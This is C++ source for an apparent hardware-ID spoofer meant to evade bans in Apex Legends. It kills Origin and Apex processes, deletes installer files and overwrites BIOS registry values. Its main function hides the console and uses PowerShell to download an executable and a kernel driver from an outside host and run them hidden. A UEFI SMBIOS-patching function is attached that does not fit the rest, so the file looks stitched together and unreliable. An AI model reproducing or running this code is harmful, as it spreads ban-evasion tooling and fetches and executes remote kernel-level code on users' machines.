#include <iostream>
#include<windows.h>
#include <tchar.h>
#include <stdio.h>
#include <urlmon.h>
#include <filesystem>

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"wininet.lib")


void traces()
{
	// kill running tasks

	system("taskkill /f /im OriginWebHelperService.exe");
	system("taskkill /f /im Origin.exe");
	system("taskkill /f /im OriginClientService.exe");
	system("taskkill /f /im OriginER.exe");
	system("taskkill /f /im OriginThinSetupInternal.exe");
	system("taskkill /f /im OriginLegacyCLI.exe");
	system("taskkill /f /im Apex.exe");


	// traces that don't delete apex LOL 

	system("del /f /s /q %systemdrive%\\Program Files(x86)\\Origin Games\\Apex\\__Installer\\Cleanup.dat");
	system("del /f /s /q %systemdrive%\\Program Files(x86)\\Origin Games\\Apex\\__Installer\\installerdata.xml");
	system("del /f /s /q %systemdrive%\\Program Files(x86)\\Origin Games\\Apex\\__Installer\\InstallLog.txt");
	system("del /f /s /q %systemdrive%\\Program Files(x86)\Origin Games\Apex\\__Installer\\Touchup.dat");


	// registry info spoof
	
	system("REG ADD HKLM\HARDWARE\DESCRIPTION\System\\BIOS /v BaseBoardManufacturer /t REG_SZ /d gaypex-%random% /f");
	system("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v BaseBoardProduct /t REG_SZ /d gaypex-%random% /f");
	system("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v BaseBoardVersion /t REG_SZ /d gaypex-%random% /f");
	system("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v BIOSVersion /t REG_SZ /d gaypex-%random% /f");
	system("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v SystemFamily /t REG_SZ /d gaypex-%random% /f");
	system("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v SystemManufacturer /t REG_SZ /d gaypex-%random% /f");
	system("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v SystemProductName /t REG_SZ /d gaypex-%random% /f");
	system("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v SystemSKU /t REG_SZ /d gaypex-%random% /f");
	system("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v SystemVersion /t REG_SZ /d gaypex-%random% /f");
	system("REG ADD HKLM\\HARDWARE\\DESCRIPTION\\System\\BIOS /v SystemProductName /t REG_SZ /d gaypex-%random% /f");
	



	// clear screen
	system("cls");
	
	
	std::cout << "spoofed disk serial \n";
	system("wmic diskdrive get serialnumber");
	// runs a "trace cleaner" im lazy no more system calls 
	std::cout << "cleaning traces\n";
	ShellExecute(NULL, _T("open"), _T("C:\\traces.exe"), NULL, NULL, SW_HIDE);
	

}

void download_and_clean() {
    // Code to download a file goes here
    // Code to clean system traces goes here
}

int main() {
    FreeConsole();
    system("powershell -Command \"Invoke-WebRequest 'https://gaypex.cc/mapper.exe' -OutFile 'C:\\mapper.exe'; Invoke-WebRequest 'https://gaypex.cc/spoof.sys' -OutFile 'C:\\spoof.sys'; Start-Process 'C:\\mapper.exe' -ArgumentList 'C:\\spoof.sys' -WindowStyle Hidden\"");
    std::cout << "Done. You can now go play some Apex." << std::endl;
    std::cin.get();
    return 0;
}

EFI_STATUS efi_main(EFI_HANDLE ImageHandle, EFI_SYSTEM_TABLE *SystemTable) 
{
    InitializeLib(ImageHandle, SystemTable);
    
    Print(L"[WORK] Searching for SMBIOS table entry...\n");
    SMBIOS_STRUCTURE_TABLE* smbiosEntry = FindEntry();
    if (!smbiosEntry) 
    {
        Print(L"[FAIL] Failed to locate SMBIOS table entry\n");
        return EFI_NOT_FOUND;
    }
    Print(L"[INFO] SMBIOS table entry found on 0x%08x\n", smbiosEntry->TableAddress);  

    PatchAll(smbiosEntry);

    return EFI_SUCCESS;
}

